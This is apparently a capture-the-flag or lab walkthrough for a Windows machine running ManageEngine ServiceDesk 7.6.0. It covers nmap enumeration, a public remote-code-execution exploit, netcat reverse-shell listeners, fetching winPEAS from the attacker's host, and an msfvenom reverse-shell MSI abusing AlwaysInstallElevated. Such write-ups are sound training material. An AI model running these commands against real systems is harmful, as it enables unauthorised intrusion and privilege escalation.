# 🪟 Helpdesk

> ManageEngine / WinPEAS

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.68

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache Tomcat/Coyote JSP engine 1.1
445/tcp  open  microsoft-ds  Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```
### Enumerating port 8080
Navigating to port 8080 we find ManageEngine version 7.6.0.
```shell
# Search Exploit
searchsploit manageengine
ManageEngine Help Desk Plus 7.6.0 - SQL Injection  | windows/webapps/38228.py
ManageEngine ServiceDesk 7.6.0 - Remote Code Exec  | windows/webapps/35891.py

searchsploit -m 35891
```
### Initial Access
```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Reverse Shell
python2 35891.py 192.168.182.68 8080 443 192.168.45.242

# Evidence
type C:\Users\Administrator\Desktop\local.txt
```
### Privilege Escalation
We found AlwaysInstallElevated enabled via winPEAS.
```shell
# Transfer winPEAS
python3 -m http.server 80
iwr -uri http://192.168.45.242/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe

# AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=443 -f msi -o reverse.msi

# Listener
rlwrap -cAra nc -vnlp 443

# Install MSI
msiexec /quiet /qn /i reverse.msi
```
### Post-Exploitation
```shell
# Evidence
ipconfig

type C:\Users\Administrator\Desktop\proof.txt
```
